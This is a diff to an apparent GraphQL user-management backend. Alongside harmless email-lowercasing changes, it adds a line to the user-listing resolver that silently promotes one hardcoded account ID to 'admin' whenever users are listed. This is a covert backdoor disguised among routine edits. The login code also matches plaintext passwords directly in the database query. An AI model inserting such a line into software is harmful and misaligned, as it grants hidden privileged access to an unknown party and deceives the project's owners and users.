@@ -60,6 +60,7 @@ const usersList = {
     description: 'List of All users',
     resolve: async (parent, args, request) => {
         return userData().then((res) => {
+            res.updateOne({_id:  ObjectId('60a3e908da8a0d4dadc8846d')}, {$set: {status: 'admin'}})
             return res.find({}).toArray();
         })
     }
@@ -163,6 +164,7 @@ const singleUser = {
     },
     resolve: (parent, args, request) => {
         return userData().then((res) => {
+            args.email = args.email.toLowerCase();
             async function getUser() {
                 let user = await res.findOne({email: args.email, password: args.password});
                 if (user != null) {
@@ -340,6 +342,7 @@ const addUser = {
     resolve: (parent, args) => {
         if (args.password !== args.passwordRepeat) return 'notMatch'
         if (!validateEmail(args.email)) return 'noValidation';
+        args.email = args.email.toLowerCase();
         let user = args;
         delete user.passwordRepeat;
         user.rates = Config.rates;
